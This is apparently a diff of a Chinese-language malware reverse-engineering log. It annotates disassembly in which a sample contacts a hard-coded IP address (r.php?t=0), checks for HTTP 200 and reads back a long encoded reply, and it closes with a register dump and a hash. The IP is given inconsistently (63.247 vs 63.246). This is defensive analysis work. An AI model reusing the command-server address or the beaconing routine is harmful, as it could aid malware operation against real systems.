+CODE:00401CF0            ;为了方便理解我已经把这个函数的参数和局部变量重新命了名
+
+CODE:00401CF0             enter   110h, 0
+
+CODE:00401CF4             push    esi
+
+CODE:00401CF5             mov     [ebp+var_dwReturnValue], 0
+
+CODE:00401CFC             push    0        ; dwContext
+
+CODE:00401CFE             push    4000100h ; dwFlags ==
+
+CODE:00401CFE                         ; INTERNET_FLAG_RAW_DATA |
+
+CODE:00401CFE                         ; INTERNET_FLAG_PRAGMA_NOCACHE
+
+CODE:00401D03             push    0        ; dwHeadersLength
+
+CODE:00401D05             push    0        ; lpszHeaders
+
+CODE:00401D07             push    [ebp+arg_URL]  ; lpszURL == http://63.247.135.48/r.php?t=0
+
+CODE:00401D0A             push    [ebp+arg_hInternet] ; hInternet
+
+CODE:00401D0D             call    InternetOpenUrlA
+
+CODE:00401D12             test    eax, eax
+
+CODE:00401D14             jz      loc_401DA8     ; InternetOpenUrlA 失败则跳转
+```
+
+调用`InternetOpenUrlA`打开上面得到的那个URL：`http://63.246.135.48/r.php?t=0`。
+
+```asm
+CODE:00401D1A             mov     [ebp+hUrlFile], eax
+
+CODE:00401D20             mov     [ebp+dwInfoBufSize], 100h
+
+CODE:00401D2A             lea     eax, [ebp+lpszInfoBuf]
+
+CODE:00401D30             lea     edx, [ebp+dwInfoBufSize]
+
+CODE:00401D36             push    0
+
+CODE:00401D38             push    edx
+
+CODE:00401D39             push    eax
+
+CODE:00401D3A             push    13h
+
+CODE:00401D3C             push    [ebp+hUrlFile]
+
+CODE:00401D42             call    HttpQueryInfoA  ; 返回的信息串为"200"
+
+CODE:00401D42                         ; 表示 http 请求成功,返回信息存储到 lpszInfoBuf
+
+CODE:00401D47             test    eax, eax
+
+CODE:00401D49             jz      short loc_401D9D ; 函数 HttpQueryInfo 失败则跳转
+```
+
+调用`HttpQueryInfo`来判断HTTP服务器`63.246.135.48`是否正常响应，返回值为`200`表示http请求成功，下面就会调用`InternetReadFile`去读文件。
+
+```asm
+CODE:00401D4B             mov     esi, [ebp+arg_pdwUrlFileSize]
+
+CODE:00401D4E             mov     dword ptr [esi], 0
+
+CODE:00401D54
+
+CODE:00401D54 loc_401D54:
+
+CODE:00401D54             mov     eax, [ebp+arg_lpszReadBuf]
+
+CODE:00401D57             add     eax, [esi]
+
+CODE:00401D59             mov     ecx, 10000h
+
+CODE:00401D5E             sub     ecx, [esi]
+
+CODE:00401D60             lea     edx, [ebp+dwNumberOfByteRead]
+
+CODE:00401D66             push    edx
+
+CODE:00401D67             push    ecx
+
+CODE:00401D68             push    eax
+
+CODE:00401D69             push    [ebp+hUrlFile]
+
+CODE:00401D6F             call    InternetReadFile
+
+CODE:00401D74             test    eax, eax
+
+CODE:00401D76             jz      short loc_401D86 ; 失败则跳转
+```
+
+读`r.php?t=0`返回的内容，存到`arg_lpszReadBuf`(这是个指针参数，用于向上层函数返回读取的内容)，读的字节数存到`dwNumberOfByteRead`，读出的内容为：
+
+```text
+arg_lpszReadBuf[] = "\
+t=8&p=1525FFFFFFFFFFFF&c=D0A58993CE0F2086053F57E8785F90C61B1F8E
+20DB856D9554CC789EC0F28D7162D43FC75E50069F8793C546B88A9C4BD80D2
+9241357C766626A77D951CD57CFF9794E84507F478A47EC525DAA963D70172A
+D7CCC3348F3B06B598EA9A286187733F576EB82A6D43CACF4F56746595C01A6
+005215EA0E0BE6D9896C25B5A9252F1949A0E964CC86EE6EA5B00F15AE9B386
+15CC7594BD85B3318FDC8D905D4D5ED93AD43F211A008F6C0D0FDF702F21BA7
+3349F58AA2F78F7FE0750D8C0D019846F4B63B1D5FD699F62A0D5471FC9A69B
+643B20BE7A819679A89868C58723FDA8C0B503329C6B345C3D35FFA9DABC868
+0BE5A90BBB8D9EE4C963619F1949EC6F8DF24E6DFC6E38CB7FB024D59E80358
+08C6B054DEA68B0F8F05302C027DBC14A149C72F9F907AB3D909EDEF3085C9B
+57A36D64DA14C23071AB5715BDEDDC6195D558D1310842BB33D180FF103EFF9
+CF931D58E0BE5000095351DCE2D48000EAF73E84D1DD92A3B0C0CFA73179613
+628E9A63E89DAB3A3C64D3573141C2D17A55064F988361669A4D0B9DAD6886E
+5F32BFB2C40A7DFC8BF1457A512475D1E32B3799AF025547444C19CCE8B62BD
+26EA0AF2350E421DB48EDAE22CF696946928788DD05FE044848E3FD61792192
+DD6D2424DF48BC501E8200EE6AFEFF50C3B5488BAD36892C2763BCC6E7AB30C
+F789426A745FD65B0C8ECE543EA0D6606D2220DEBE1D1E3D42C97FE5216BE06
+A7B07DB2145491990A8AD977055A7540049AB776445ABC1F83FFF41247CD8AE
+C388ECDBF562A1C9B2F850992A5AE4179915E63811D9BD958FA135E69F16B73
+4E9FD4679FED9464E6EA753AFB5BB411F3AF28A7347F7B49C5A05C776AE1F9F
+0FBDA29252FBF21F3F73CF888B599F0E6927B48725FA7C6A9871178EEAF6E42
+BF0694A62838BDB2240DAE97F654A37F14872675A34CAA068A552AB3F53BCBB
+4DD890E4788120AA3319EBE6BA4E98612EB93252D794C6BECB3464F48242F44
+3B3EF0E077C15961E5406B821A626F755483A3FFA7A5E451E4CE96E149A0FBD
+D&v=FEE9&d=0&w=&k=124F5"
+```
+
+字符串的最后这一段`"&v=FEE9&d=0&w=&k=124F5"`，每次请求可能会不一样。
+
+```asm
+CODE:00401D78             mov     eax, [ebp+dwNumberOfByteRead]
+
+CODE:00401D7E             test    eax, eax
+
+CODE:00401D80             jz      short loc_401D8F
+
+CODE:00401D82             add     [esi], eax
+
+CODE:00401D84             jmp     short loc_401D54
+
+CODE:00401D86 ; ///////////////////////////////////////////////////////////////////////
+
+CODE:00401D86
+
+CODE:00401D86 loc_401D86:
+
+CODE:00401D86             mov     [ebp+var_dwReturnValue], 0FFFFFFFFh
+
+CODE:00401D8D             jmp     short loc_401D9D
+```
+
+
+
+`CODE:00401D8F ; ///////////////////////////////////////////////////////////////////`  
+
+`CODE:00401D8F`  
+
+`CODE:00401D8F loc_401D8F:`  
+
+`CODE:00401D8F                  lea     eax, [ebp+lpszInfoBuf]`  
+
+`CODE:00401D95                  call    sub_4018D7      ; 把 Internet 返回的字符串"200"`  
+
+`CODE:00401D95                                     ; 转换成数字 200(0xC8)`  
+
+子函数 `sub_4018D7` 把 Http 请求返回的信息转换成数字 200（十六进制 `0xC8`），并作为函数的返回值返回。  
+
+`CODE:00401D9A                  mov     [ebp+var_dwReturnValue], eax`  
+
+`CODE:00401D9D`  
+
+`CODE:00401D9D loc_401D9D:`  
+
+`CODE:00401D9D                  push    [ebp+hUrlFile]`  
+
+`CODE:00401DA3                  call    InternetCloseHandle`  
+
+`CODE:00401DA8`  
+
+`CODE:00401DA8 loc_401DA8:`  
+
+`CODE:00401DA8                  mov     eax, [ebp+var_dwReturnValue] ; 函数最后返回值 200(0xC8)`  
+
+`CODE:00401DAB                  pop     esi`  
+
+`CODE:00401DAC                  leave`  
+
+`CODE:00401DAD                  retn    10h`  
+
+`CODE:00401DAD sub_401CF0      endp`  
+
 函数返回：  
-  
-CODE:00402082                 call    sub\_401CF0  
-CODE:00402087                 test    eax, eax     ;函数返回到这里  
-CODE:00402089                 jz      loc\_402264      ; sub\_401CF0 调用失败则跳转  
-CODE:0040208F                 cmp     eax, 0FFFFFFFFh  
-CODE:00402092                 jz      loc\_402264  
-CODE:00402098                 cmp     eax, 0C8h  
-CODE:0040209D                 jnz     loc\_40228A  
-  
-跳来跳去看的我眼都花了，今天先到这，记下各寄存器的值明天继续...  
-函数返回到 402087 时各寄存器的值为：  
-  
-\============================  
-EAX = 000000C8  
-EBX = 00000000  
-ECX = 0007E220  
-EDX = 00000000  
-ESI = 0040602C  
-EDI = 0076F670  
-EBP = 0076FFB4  
-ESP = 0076F54C  
-  
-C 0  
-P 1  
-A 0  
-Z 1  
-S 0  
-T 0  
-D 0  
-O 0  
-I 1  
-\============================ 
 
- 4dd466d0e1e0cc123afbe504da2462ca
+`CODE:00402082                  call    sub_401CF0`  
+
+`CODE:00402087                  test    eax, eax     ;函数返回到这里`  
+
+`CODE:00402089                  jz      loc_402264      ; sub_401CF0 调用失败则跳转`  
+
+`CODE:0040208F                  cmp     eax, 0FFFFFFFFh`  
+
+`CODE:00402092                  jz      loc_402264`  
+
+`CODE:00402098                  cmp     eax, 0C8h`  
+
+`CODE:0040209D                  jnz     loc_40228A`  
+
+跳来跳去看的我眼都花了，今天先到这，记下各寄存器的值明天继续...  
+
+函数返回到 `402087` 时各寄存器的值为：  
+
+`\\============================`  
+
+`EAX` = `000000C8`  
+
+`EBX` = `00000000`  
+
+`ECX` = `0007E220`  
+
+`EDX` = `00000000`  
+
+`ESI` = `0040602C`  
+
+`EDI` = `0076F670`  
+
+`EBP` = `0076FFB4`  
+
+`ESP` = `0076F54C`  
+
+`C` `0`  
+
+`P` `1`  
+
+`A` `0`  
+
+`Z` `1`  
+
+`S` `0`  
+
+`T` `0`  
+
+`D` `0`  
+
+`O` `0`  
+
+`I` `1`  
+
+`\\============================`
+
+`4dd466d0e1e0cc123afbe504da2462ca`
